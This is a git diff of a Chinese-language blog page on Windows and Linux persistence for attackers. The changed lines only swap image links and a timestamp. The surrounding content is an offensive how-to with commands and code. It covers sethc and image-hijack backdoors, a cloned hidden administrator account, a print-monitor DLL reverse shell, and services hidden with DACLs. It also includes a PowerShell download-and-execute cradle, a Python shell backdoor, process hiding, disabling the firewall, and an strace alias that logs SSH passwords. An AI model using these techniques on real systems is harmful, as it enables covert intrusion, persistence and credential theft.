@@ -397,7 +397,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-25 16:42:43'>2023-03-25 16:39</time>
+            发布时间 : <time class="date" title='最后更新: 2023-03-25 17:30:54'>2023-03-25 16:39</time>
         
     </div>
     <div class="article-meta">
@@ -466,7 +466,7 @@ Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
 <li>五次shift即可cmd</li>
 </ol>
 <h3 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h3><p><code>Attrib +s +a +h +r 1.php</code> 隐藏文件或者目录</p>
-<h3 id="文件保护"><a href="#文件保护" class="headerlink" title="文件保护"></a>文件保护</h3><p><a target="_blank" rel="noopener" href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a>   //windows文件保护<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251632451.png" alt="image.png"></p>
+<h3 id="文件保护"><a href="#文件保护" class="headerlink" title="文件保护"></a>文件保护</h3><p><a target="_blank" rel="noopener" href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a>   //windows文件保护<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251730702.png" alt="image.png"></p>
 <ol>
 <li>一般只留第一个</li>
 <li>sc qc/stop/delete xlkfs    //检查/停止/删除这个文件保护的服务  <h3 id="todesk"><a href="#todesk" class="headerlink" title="todesk"></a>todesk</h3>官方文档<a target="_blank" rel="noopener" href="https://www.todesk.com/helpcenter/solo-65.html">https://www.todesk.com/helpcenter/solo-65.html</a></li>
@@ -478,7 +478,7 @@ for /f &quot;delims=&quot; %%i in (&#39;&quot;C:\Program Files (x86)\ToDesk\ToDe
 Pause
 </code></pre>
 </li>
-<li>设置密钥123456，开机自启<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636134.png" alt="image.png"></li>
+<li>设置密钥123456，开机自启<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251728749.png" alt="image.png"></li>
 <li>如果目标机器已安装todesk<ol>
 <li>这种意外情况对于我们来说就挺，应该是那种想到了开心的事的感觉。其实在这里要说的是另一种方法获取识别码以及连接密码，我们只需要找到todesk的根目录即可，然后查看config.ini，在cinfig.ini可以找到识别码以及加密的密码。</li>
 </ol>
@@ -493,14 +493,14 @@ netstat -anop tcp | find &quot;3389&quot;
 </code></pre>
 <h3 id="映像劫持技术"><a href="#映像劫持技术" class="headerlink" title="映像劫持技术"></a>映像劫持技术</h3><ol>
 <li>打开注册表计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    </li>
-<li>新建一个项ziye.exe ，右侧新增一个字符串，名字是Debugger    <pre><code>![image-20221110140524525](./权限维持.assets/202303251636117.png)
+<li>新建一个项ziye.exe ，右侧新增一个字符串，名字是Debugger    <pre><code>![image-20221110140524525](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251728138.png)
 </code></pre>
 </li>
 <li>值为要执行的程序<code>C:\Windows\System32\cmd.exe</code>(必须是这个这个斜杠)</li>
 <li>这个效果就是只要执行任意一个叫做ziye.exe的程序(常用sethc.exe粘滞键)，就会运行cmd.exe</li>
 <li>一般可以是cmd，木马等</li>
 </ol>
-<h3 id="策略组脚本维持-第一次可能会蓝屏"><a href="#策略组脚本维持-第一次可能会蓝屏" class="headerlink" title="策略组脚本维持(第一次可能会蓝屏)"></a>策略组脚本维持(第一次可能会蓝屏)</h3><p><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636151.png" alt="image-20221110142513383"></p>
+<h3 id="策略组脚本维持-第一次可能会蓝屏"><a href="#策略组脚本维持-第一次可能会蓝屏" class="headerlink" title="策略组脚本维持(第一次可能会蓝屏)"></a>策略组脚本维持(第一次可能会蓝屏)</h3><p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251728173.png" alt="image-20221110142513383"></p>
 <ol>
 <li>输入gpedit.msc 打开组策略，打开 windows设置 脚本 里面又关机和开机</li>
 <li>在C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup放入开机需要自启动的文件</li>
@@ -510,9 +510,9 @@ netstat -anop tcp | find &quot;3389&quot;
 <li>建立新的用户<pre><code>net user qianxin$ QanXin.Nb123 /add &amp; net localgroup administrators qianxin$ /add    
 </code></pre>
 </li>
-<li> 注册表打开HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User<br>到SAM没有子目录，说明没有权限，赋权，重新打开注册表即可<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636616.png" alt="image-20221110155715652"></li>
+<li> 注册表打开HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User<br>到SAM没有子目录，说明没有权限，赋权，重新打开注册表即可<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251728646.png" alt="image-20221110155715652"></li>
 <li>将1F4下F项的值复制到3E8下F项里面，替换原有数据<br>双击F项，右键全选，右键复制，同流程覆盖</li>
-<li> 把3E8和qianxin$导出来<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636776.png" alt="image-20221110160323063"></li>
+<li> 把3E8和qianxin$导出来<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729712.png" alt="image-20221110160323063"></li>
 <li>  net user qianxin$ /del</li>
 <li> 双击导出来的两个注册表进行导入</li>
 <li> <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code>开3389</li>
@@ -558,7 +558,7 @@ pName //监视器名称<br>pEnvironment //环境架构<br>pDLLName //监视器DL
 <li>将shell.dll复制到目标主机的system32目录下，之后重命名为test.dll(也就是上面的<br>PDLLName，你也可以自己修改为自己喜欢的，总之随意)<br><code>copy C:\temp\shell.dll C:\Windows\System32\test.dll</code></li>
 <li>将Monitors.exe也移动到C:\Windows\System32，这是执行Monitors.exe即可反弹shell</li>
 <li><code>reg add &quot;hklm\system\currentcontrolset\control\print\monitors\Pentestlab&quot; /v &quot;Driver&quot; /d &quot;test.dll&quot; /t REG_SZ</code>    //塞到开机启动项里 </li>
-<li>打开注册表查看<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>是否写入成功<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636786.png" alt="image-20221110170643019"></li>
+<li>打开注册表查看<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>是否写入成功<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729113.png" alt="image-20221110170643019"></li>
 <li>msf监听，受害机重启即可收到监听</li>
 </ol>
 <h3 id="利用安全描述符隐藏服务后门进行权限维持"><a href="#利用安全描述符隐藏服务后门进行权限维持" class="headerlink" title="利用安全描述符隐藏服务后门进行权限维持"></a>利用安全描述符隐藏服务后门进行权限维持</h3><p>将后门程序注册为自启动服务是我们常用的一种进行权限维持的方法，通常可以通过sc或者powershell来进行创建。本文创建服务名为.NET CLR Networking 3.5.0.0的服务(什么名字都可以)</p>
@@ -570,7 +570,7 @@ sc create &quot;.NET CLR Networking 3.5.0.0&quot; binpath= &quot;cmd.exe /k C:\U
 new-service –Name &quot;.NET CLR Networking 3.5.0.0&quot; –DisplayName &quot;.NET CLR Networking 3.5.0.0&quot; –BinaryPathName &quot;cmd.exe /k C:\Users\administrator\beacon.exe&quot; –StartupType AutomaticDelayedStart
 </code></pre>
 </li>
-<li><p>但创建的服务很容易被发现 通过 sc query 和 Get-Service 很容易发现，直接查询服务也能看见<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636820.png" alt="image-20221110181956500"><br>开启服务<code>sc start &quot;.NET CLR Networking 3.5.0.0&quot;</code></p>
+<li><p>但创建的服务很容易被发现 通过 sc query 和 Get-Service 很容易发现，直接查询服务也能看见<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729640.png" alt="image-20221110181956500"><br>开启服务<code>sc start &quot;.NET CLR Networking 3.5.0.0&quot;</code></p>
 </li>
 <li><p>使服务拒绝访问</p>
 <pre><code class="cmd">sc sdset &quot;.NET CLR Networking 3.5.0.0&quot; &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
@@ -579,9 +579,9 @@ new-service –Name &quot;.NET CLR Networking 3.5.0.0&quot; –DisplayName &quot
 <pre><code class="cmd">sc query |findstr &quot;.NET CLR Networking 3.5.0.0&quot;
 get-service | findstr &quot;.NET CLR Networking 3.5.0.0&quot;
 </code></pre>
-<p>在知道服务名的前提下查询会显示拒绝访问：<br><code>sc query &quot;.NET CLR Networking 3.5.0.0&quot;</code><br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636550.png" alt="image-20221110184608987"></p>
+<p>在知道服务名的前提下查询会显示拒绝访问：<br><code>sc query &quot;.NET CLR Networking 3.5.0.0&quot;</code><br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729703.png" alt="image-20221110184608987"></p>
 </li>
-<li><p>但这样做有一个问题：在注册表中很容易看到异常value。<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 3.5.0.0</code><br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251636211.png" alt="image-20221110184952435"><br>我们可以通过修改注册表的DACL来拒绝对值的查询，达到隐藏异常值的效果。<br>这里给出一个通过powershell修改注册表项的访问权限的简单脚本：<br>将这个脚本保存为1.ps1</p>
+<li><p>但这样做有一个问题：在注册表中很容易看到异常value。<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 3.5.0.0</code><br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729078.png" alt="image-20221110184952435"><br>我们可以通过修改注册表的DACL来拒绝对值的查询，达到隐藏异常值的效果。<br>这里给出一个通过powershell修改注册表项的访问权限的简单脚本：<br>将这个脚本保存为1.ps1</p>
 <pre><code class="powershell">function Server-Sddl-Change&#123;
 [CmdletBinding()]
 param
@@ -617,7 +617,7 @@ Set-Acl $S $acl
 <p>kali上起一个http<br><code>python -m http.server 8080</code><br>受害机远程加载powershell脚本：</p>
 <pre><code class="powershell">powershell.exe -exec bypass -nop -w hidden -c &quot;IEX((new-object net.webclient).downloadstring(&#39;http://192.168.1.147/1.ps1&#39;));Server-Sddl-Change -Name &#39;.NET CLR Networking 3.5.0.0&#39;&quot;
 </code></pre>
-<p><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251637649.png" alt="image-20221110194805525"></p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729558.png" alt="image-20221110194805525"></p>
 </li>
 <li><p>成功隐藏，只要电脑重启就可以获得后门</p>
 </li>
@@ -632,7 +632,7 @@ Set-Acl $S $acl
 &lt;/system.webServer&gt;
 &lt;/configuration&gt;
 </code></pre>
-<p>打开 IIS_backdoor_shell 把网址填写进去即可<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251637609.png" alt="image-20221110201650944"></p>
+<p>打开 IIS_backdoor_shell 把网址填写进去即可<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729237.png" alt="image-20221110201650944"></p>
 <h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="crontab计划任务弹shell"><a href="#crontab计划任务弹shell" class="headerlink" title="crontab计划任务弹shell"></a>crontab计划任务弹shell</h3><ol>
 <li>crontab默认是开的<pre><code class="sh">crontab -l   //列出任务
 crontab -e   //编辑任务
@@ -667,7 +667,7 @@ p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;]);
 <ol>
 <li>这里提供了两种后门，尽量用正向的，将后门保存为dir.py</li>
 <li><code>systemctl stop firewalld.service</code>关防火墙</li>
-<li> <code>nohup python3 dir.py &gt; /dev/null 2&gt;&amp;1 &amp;</code>  可以看到是python<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251637020.png" alt="image-20221110220844632"><br>会开启一个11端口的正向后门kali使用nc直接连接即可<br><code>nohup vim -E -c &quot;pyfile dir.py&quot;&amp;</code>   这样就可以使vim了</li>
+<li> <code>nohup python3 dir.py &gt; /dev/null 2&gt;&amp;1 &amp;</code>  可以看到是python<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251729045.png" alt="image-20221110220844632"><br>会开启一个11端口的正向后门kali使用nc直接连接即可<br><code>nohup vim -E -c &quot;pyfile dir.py&quot;&amp;</code>   这样就可以使vim了</li>
 <li>隐藏进程<pre><code>mkdir null
 mount --bind null /proc/5480
 netstat -anpt
@@ -780,7 +780,7 @@ ssh -i id_rsa root@192.168.1.148
 添加alias ssh=&#39;strace -o /tmp/.sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39;
 source .bashrc    //刷新环境变量
 </code></pre>
-<p><code>grep -A 9 &#39;password&#39;  /tmp/.sshpwd-1211月111668255299.log</code>  查看ssh登录密码<br><img src="./%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/202303251637100.png" alt="image-20221112202325850"></p>
+<p><code>grep -A 9 &#39;password&#39;  /tmp/.sshpwd-1211月111668255299.log</code>  查看ssh登录密码<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303251730867.png" alt="image-20221112202325850"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1210396142@qq.com </span>
